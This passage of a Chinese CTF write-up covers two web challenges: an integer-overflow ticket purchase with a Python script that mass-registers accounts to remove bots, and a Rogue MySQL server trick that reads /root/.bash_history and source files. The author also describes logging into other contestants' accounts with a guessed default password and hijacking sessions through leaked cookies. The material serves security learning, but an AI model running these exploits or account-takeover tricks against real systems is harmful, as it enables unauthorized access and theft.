注册用户登陆系统并购买入场票据,淘汰所有对手就能吃鸡啦~</p><p>本题不需要使用扫描器</p><p>{% endcolorquote %}</p><h3 id=hacking-5>Hacking</h3><p>一开始一直在溢出购买的这里，但是一旦溢出了，服务器就返回 500 了&mldr;</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/ctf/api/buy_ticket?ticket_price=2000</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>117.51.147.155:5050</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>application/json</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://117.51.147.155:5050/index.html</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>user_name=zedd; REVEL_SESSION=ef66cfc3f5199180eea686597f4a1e72</span>
</span></span></code></pre></div><p>然后看到一道类似<a class=link href=https://wulidecade.cn/index.php/archives/127/#menu_index_7 target=_blank rel=noopener>护网杯Itshop</a>题目，所以考虑这个地方是不是也是用的是余额-支出这么个操作来溢出呢</p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007646.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007646.jpg loading=lazy></a></figure></p><p>查找 GoLang 的相关数据类型，用 uint32 成功溢出。</p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007444.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007444.jpg loading=lazy></a></figure></p><p>猜测在 price 转换成 int 的时候发生溢出变成 -1 ，导致余额减去花费大于0，成功绕过判断买到入场券。</p><p>之后就比较简单了，可以通过输入 ticket 杀 bot ，猜测 id 与 ticket 有某种映射关系，可以注册一系列小号买 ticket 保大号杀。</p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006639.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006639.jpg loading=lazy></a></figure></p><p>附上脚本。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>username</span> <span class=o>=</span> <span class=s1>&#39;zedde&#39;</span>
</span></span><span class=line><span class=cl><span class=n>base_url</span> <span class=o>=</span> <span class=s1>&#39;http://117.51.147.155:5050&#39;</span>
</span></span><span class=line><span class=cl><span class=n>register</span> <span class=o>=</span> <span class=n>base_url</span> <span class=o>+</span> <span class=s1>&#39;/ctf/api/register?name=</span><span class=si>{0}</span><span class=s1>&amp;password=12345678&#39;</span>
</span></span><span class=line><span class=cl><span class=n>buy_url</span> <span class=o>=</span> <span class=n>base_url</span> <span class=o>+</span> <span class=s1>&#39;/ctf/api/buy_ticket?ticket_price=4294967296&#39;</span>
</span></span><span class=line><span class=cl><span class=n>search_url</span> <span class=o>=</span> <span class=n>base_url</span> <span class=o>+</span> <span class=s1>&#39;/ctf/api/search_bill_info&#39;</span>
</span></span><span class=line><span class=cl><span class=n>pay_url</span> <span class=o>=</span> <span class=n>base_url</span> <span class=o>+</span> <span class=s1>&#39;/ctf/api/pay_ticket?bill_id=&#39;</span>
</span></span><span class=line><span class=cl><span class=n>remove_url</span> <span class=o>=</span> <span class=n>base_url</span> <span class=o>+</span> <span class=s1>&#39;/ctf/api/remove_robot?id=</span><span class=si>{0}</span><span class=s1>&amp;ticket=</span><span class=si>{1}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>cookies</span> <span class=o>=</span> <span class=nb>dict</span><span class=p>(</span><span class=n>user_name</span><span class=o>=</span><span class=s1>&#39;zedd&#39;</span><span class=p>,</span><span class=n>REVEL_SESSION</span><span class=o>=</span><span class=s1>&#39;ef66cfc3f5199180eea686597f4a1e72&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>700</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>user</span> <span class=o>=</span> <span class=n>username</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>register_url</span> <span class=o>=</span> <span class=n>register</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>user</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>req</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>session</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>rep</span> <span class=o>=</span> <span class=n>req</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>register_url</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>rep</span> <span class=o>=</span> <span class=n>req</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>buy_url</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>rep</span> <span class=o>=</span> <span class=n>req</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>search_url</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>str_text</span> <span class=o>=</span> <span class=sa>r</span><span class=s1>&#39;&#34;bill_id&#34;:&#34;(.*)&#34;,&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>match</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>str_text</span><span class=p>,</span> <span class=n>rep</span><span class=o>.</span><span class=n>text</span><span class=p>,</span> <span class=n>re</span><span class=o>.</span><span class=n>M</span><span class=o>|</span><span class=n>re</span><span class=o>.</span><span class=n>I</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>match</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>bill_id</span> <span class=o>=</span> <span class=n>match</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>rep</span> <span class=o>=</span> <span class=n>req</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>pay_url</span> <span class=o>+</span> <span class=n>bill_id</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>matchObj</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span> <span class=sa>r</span><span class=s1>&#39;{&#34;your_id&#34;:(.*),&#34;your_ticket&#34;:&#34;(.*)&#34;}]&#39;</span><span class=p>,</span> <span class=n>rep</span><span class=o>.</span><span class=n>text</span><span class=p>,</span> <span class=n>re</span><span class=o>.</span><span class=n>M</span><span class=o>|</span><span class=n>re</span><span class=o>.</span><span class=n>I</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># print(rep.text)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>matchObj</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>bot_id</span> <span class=o>=</span> <span class=n>matchObj</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>ticket</span> <span class=o>=</span> <span class=n>matchObj</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>continue</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>remove_url</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>bot_id</span><span class=p>,</span><span class=n>ticket</span><span class=p>),</span> <span class=n>cookies</span><span class=o>=</span><span class=n>cookies</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span></code></pre></div><p>这题还有一种 trick 就是猜榜单已经做出来的师傅的密码，一般 id 都是师傅们的 id ，密码大多都是12345678(别问我怎么知道…我也是12345678&mldr;</p><p>比如这位师傅，用 12345678 登进去就拿到他的 flag 了。后面就是你敢不敢交的问题了&mldr;手动斜眼，毕竟后面有一段看起来貌似是随机的字符串…可能是主办方用来防作弊的？不得而知…hhhh</p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006149.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006149.jpg loading=lazy></a></figure></p><p>后面看官方的 wp 发现光房预设解其实是想让选手用 md5 长度拓展攻击去做的，也可以通过下面这题 mysql 弱口令来读吃鸡的源码拿 flag。</p><p>另外：登录那里还有个水平越权，无论成功与否，都会返回用户的 cookie ，因此也可以猜师傅们的用户名，直接带着 cookie 去看他的<code>/main/result</code>即可。(2333</p><h2 id=web-7-web-mysql弱口令>Web 7 WEB mysql弱口令</h2><h3 id=description-6>Description</h3><p>{% colorquote info %}</p><p><a class=link href=http://117.51.147.155:5000/index.html#/scan target=_blank rel=noopener>http://117.51.147.155:5000/index.html#/scan</a>
部署agent.py再进行扫描哦~</p><p>本题不需要使用扫描器</p><p>{% endcolorquote %}</p><h3 id=hacking-6>Hacking</h3><p>很经典的 Rogue-Mysql-Server 一题，但是坑点还是有的。建议使用这个 Github 仓库来做<a class=link href=https://github.com/allyshka/Rogue-MySql-Server target=_blank rel=noopener>allyshka/Rogue-MySql-Server</a></p><p>题目给了一个 agent.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python</span>
</span></span><span class=line><span class=cl><span class=c1># -*- coding: utf-8 -*-</span>
</span></span><span class=line><span class=cl><span class=c1># @Time    : 12/1/2019 2:58 PM</span>
</span></span><span class=line><span class=cl><span class=c1># @Author  : fz</span>
</span></span><span class=line><span class=cl><span class=c1># @Site    : </span>
</span></span><span class=line><span class=cl><span class=c1># @File    : agent.py</span>
</span></span><span class=line><span class=cl><span class=c1># @Software: PyCharm</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>http.server</span> <span class=kn>import</span> <span class=n>HTTPServer</span><span class=p>,</span> <span class=n>BaseHTTPRequestHandler</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>optparse</span> <span class=kn>import</span> <span class=n>OptionParser</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>subprocess</span> <span class=kn>import</span> <span class=n>Popen</span><span class=p>,</span> <span class=n>PIPE</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>RequestHandler</span><span class=p>(</span><span class=n>BaseHTTPRequestHandler</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>do_GET</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>request_path</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>path</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>----- Request Start -----&gt;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;request_path :&#34;</span><span class=p>,</span> <span class=n>request_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;self.headers :&#34;</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>headers</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;&lt;----- Request End -----</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>send_response</span><span class=p>(</span><span class=mi>200</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>send_header</span><span class=p>(</span><span class=s2>&#34;Set-Cookie&#34;</span><span class=p>,</span> <span class=s2>&#34;foo=bar&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>end_headers</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>result</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>_func</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>wfile</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>json</span><span class=o>.</span><span class=n>dumps</span><span class=p>(</span><span class=n>result</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>do_POST</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>request_path</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>path</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># print(&#34;\n----- Request Start -----&gt;\n&#34;)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;request_path : </span><span class=si>%s</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>request_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>request_headers</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>headers</span>
</span></span><span class=line><span class=cl>        <span class=n>content_length</span> <span class=o>=</span> <span class=n>request_headers</span><span class=o>.</span><span class=n>getheaders</span><span class=p>(</span><span class=s1>&#39;content-length&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>length</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>content_length</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span> <span class=k>if</span> <span class=n>content_length</span> <span class=k>else</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># print(&#34;length :&#34;, length)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;request_headers : </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>request_headers</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;content : </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=bp>self</span><span class=o>.</span><span class=n>rfile</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=n>length</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=c1># print(&#34;&lt;----- Request End -----\n&#34;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>send_response</span><span class=p>(</span><span class=mi>200</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>send_header</span><span class=p>(</span><span class=s2>&#34;Set-Cookie&#34;</span><span class=p>,</span> <span class=s2>&#34;foo=bar&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>end_headers</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>result</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>_func</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>wfile</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>json</span><span class=o>.</span><span class=n>dumps</span><span class=p>(</span><span class=n>result</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>_func</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>netstat</span> <span class=o>=</span> <span class=n>Popen</span><span class=p>([</span><span class=s1>&#39;netstat&#39;</span><span class=p>,</span> <span class=s1>&#39;-tlnp&#39;</span><span class=p>],</span> <span class=n>stdout</span><span class=o>=</span><span class=n>PIPE</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>netstat</span><span class=o>.</span><span class=n>wait</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>ps_list</span> <span class=o>=</span> <span class=n>netstat</span><span class=o>.</span><span class=n>stdout</span><span class=o>.</span><span class=n>readlines</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>result</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>item</span> <span class=ow>in</span> <span class=n>ps_list</span><span class=p>[</span><span class=mi>2</span><span class=p>:]:</span>
</span></span><span class=line><span class=cl>            <span class=n>tmp</span> <span class=o>=</span> <span class=n>item</span><span class=o>.</span><span class=n>split</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>Local_Address</span> <span class=o>=</span> <span class=n>tmp</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=n>Process_name</span> <span class=o>=</span> <span class=n>tmp</span><span class=p>[</span><span class=mi>6</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=n>tmp_dic</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;local_address&#39;</span><span class=p>:</span> <span class=n>Local_Address</span><span class=p>,</span> <span class=s1>&#39;Process_name&#39;</span><span class=p>:</span> <span class=n>Process_name</span><span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=n>result</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>tmp_dic</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>result</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>do_PUT</span> <span class=o>=</span> <span class=n>do_POST</span>
</span></span><span class=line><span class=cl>    <span class=n>do_DELETE</span> <span class=o>=</span> <span class=n>do_GET</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>port</span> <span class=o>=</span> <span class=mi>8123</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Listening on localhost:</span><span class=si>%s</span><span class=s1>&#39;</span> <span class=o>%</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>server</span> <span class=o>=</span> <span class=n>HTTPServer</span><span class=p>((</span><span class=s1>&#39;0.0.0.0&#39;</span><span class=p>,</span> <span class=n>port</span><span class=p>),</span> <span class=n>RequestHandler</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>server</span><span class=o>.</span><span class=n>serve_forever</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>parser</span> <span class=o>=</span> <span class=n>OptionParser</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>parser</span><span class=o>.</span><span class=n>usage</span> <span class=o>=</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;Creates an http-server that will echo out any GET or POST parameters, and respond with dummy data</span><span class=se>\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;Run:</span><span class=se>\n\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>(</span><span class=n>options</span><span class=p>,</span> <span class=n>args</span><span class=p>)</span> <span class=o>=</span> <span class=n>parser</span><span class=o>.</span><span class=n>parse_args</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
</span></span></code></pre></div><p>这里可能会比较容易误导，题目是固定地去请求你的 8123 端口，你必须得在 8123 部署这个 agent.py ，然后看代码，这个 agent.py 并没有做一个内网转发代理什么的，只不过是探测你部署的机器上有没有运行 mysqld 服务以及对应的服务端口是什么，然后他在外网去访问 agent.py 返回的 mysql 的端口。知道这个就非常好做了，基本坑都绕过了&mldr;不然的话就像一开始只能一个个排错什么的&mldr;</p><p>只要把 agent.py 中的返回直接给他改了，改成直接返回自己的端口即可。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl> <span class=k>def</span> <span class=nf>_func</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>netstat</span> <span class=o>=</span> <span class=n>Popen</span><span class=p>([</span><span class=s1>&#39;netstat&#39;</span><span class=p>,</span> <span class=s1>&#39;-tlnp&#39;</span><span class=p>],</span> <span class=n>stdout</span><span class=o>=</span><span class=n>PIPE</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>netstat</span><span class=o>.</span><span class=n>wait</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>ps_list</span> <span class=o>=</span> <span class=n>netstat</span><span class=o>.</span><span class=n>stdout</span><span class=o>.</span><span class=n>readlines</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>result</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>item</span> <span class=ow>in</span> <span class=n>ps_list</span><span class=p>[</span><span class=mi>2</span><span class=p>:]:</span>
</span></span><span class=line><span class=cl>            <span class=n>tmp</span> <span class=o>=</span> <span class=n>item</span><span class=o>.</span><span class=n>split</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>Local_Address</span> <span class=o>=</span> <span class=n>tmp</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=n>Process_name</span> <span class=o>=</span> <span class=n>tmp</span><span class=p>[</span><span class=mi>6</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=n>tmp_dic</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;local_address&#39;</span><span class=p>:</span> <span class=s1>&#39;0.0.0.0:3306&#39;</span><span class=p>,</span> <span class=s1>&#39;Process_name&#39;</span><span class=p>:</span> <span class=s1>&#39;mysqld&#39;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=n>result</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>tmp_dic</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>result</span>
</span></span></code></pre></div><p>例如这样，不一定非得 3306 ，可以把 Rogue Mysql 那一套放在其他端口也可。</p><p>其他的都是一贯的 Rogue Mysql 的操作，这里就不重复演示了。</p><p>然后可以去读<code>/root/.bash_history</code>看之前的路径文件，发现在<code>/home/dc2-user/ctf_web_2/app/main/views.py</code>可以读到题目源码</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># coding=utf-8</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>jsonify</span><span class=p>,</span> <span class=n>request</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>struct</span> <span class=kn>import</span> <span class=n>unpack</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>socket</span> <span class=kn>import</span> <span class=n>inet_aton</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>MySQLdb</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>subprocess</span> <span class=kn>import</span> <span class=n>Popen</span><span class=p>,</span> <span class=n>PIPE</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># flag in mysql  curl@localhost database:security  table:flag</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>weak_scan</span><span class=p>():</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>agent_port</span> <span class=o>=</span> <span class=mi>8123</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>target_ip</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;target_ip&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>target_port</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;target_port&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>target_ip</span> <span class=ow>or</span> <span class=ow>not</span> <span class=n>target_port</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s2>&#34;code&#34;</span><span class=p>:</span> <span class=mi>404</span><span class=p>,</span> <span class=s2>&#34;msg&#34;</span><span class=p>:</span> <span class=s2>&#34;åæ°ä¸è½ä¸ºç©º&#34;</span><span class=p>,</span> <span class=s2>&#34;data&#34;</span><span class=p>:</span> <span class=p>[]})</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>target_port</span><span class=o>.</span><span class=n>isdigit</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s2>&#34;code&#34;</span><span class=p>:</span> <span class=mi>404</span><span class=p>,</span> <span class=s2>&#34;msg&#34;</span><span class=p>:</span> <span class=s2>&#34;ç«¯å£å¿é¡»ä¸ºæ°å­&#34;</span><span class=p>,</span> <span class=s2>&#34;data&#34;</span><span class=p>:</span> <span class=p>[]})</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>checkip</span><span class=p>(</span><span class=n>target_ip</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s2>&#34;code&#34;</span><span class=p>:</span> <span class=mi>404</span><span class=p>,</span> <span class=s2>&#34;msg&#34;</span><span class=p>:</span> <span class=s2>&#34;å¿é¡»è¾å¥ip&#34;</span><span class=p>,</span> <span class=s2>&#34;data&#34;</span><span class=p>:</span> <span class=p>[]})</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>is_inner_ipaddress</span><span class=p>(</span><span class=n>target_ip</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s2>&#34;code&#34;</span><span class=p>:</span> <span class=mi>404</span><span class=p>,</span> <span class=s2>&#34;msg&#34;</span><span class=p>:</span> <span class=s2>&#34;ipä¸è½æ¯åç½ip&#34;</span><span class=p>,</span> <span class=s2>&#34;data&#34;</span><span class=p>:</span> <span class=p>[]})</span>
</span></span><span class=line><span class=cl>    <span class=n>tmp_agent_result</span> <span class=o>=</span> <span class=n>get_agent_result</span><span class=p>(</span><span class=n>target_ip</span><span class=p>,</span> <span class=n>agent_port</span><span class=p>)</span>
